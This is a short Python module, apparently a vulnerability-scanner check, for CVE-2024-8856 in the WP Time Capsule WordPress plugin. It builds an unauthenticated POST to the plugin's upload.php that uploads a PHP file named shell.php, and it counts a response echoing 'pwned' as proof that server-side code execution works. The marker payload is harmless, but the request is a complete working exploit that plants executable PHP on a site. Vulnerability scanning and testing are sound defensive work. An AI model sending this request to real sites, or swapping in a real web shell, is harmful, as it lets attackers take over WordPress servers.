"""
Backup & Staging by WP Time Capsule <= 1.21.16 (CVE-2024-8856) - File Upload RCE
Description: Unauthenticated arbitrary file upload via upload.php endpoint
Severity: Critical
CVSS Score: 9.8
Affected Versions: WP Time Capsule <= 1.21.16
Reference: https://www.exploit-db.com/exploits/52131
"""

def get_payload():
    return {
        'path': '/wp-content/plugins/wp-time-capsule/upload.php',
        'method': 'POST',
        'headers': {
            'Content-Type': 'multipart/form-data'
        },
        'files': {
            'file': ('shell.php', '<?php echo "pwned"; ?>', 'application/x-php')
        }
    }

def check_response(response):
    return response.status_code == 200 and 'pwned' in response.text 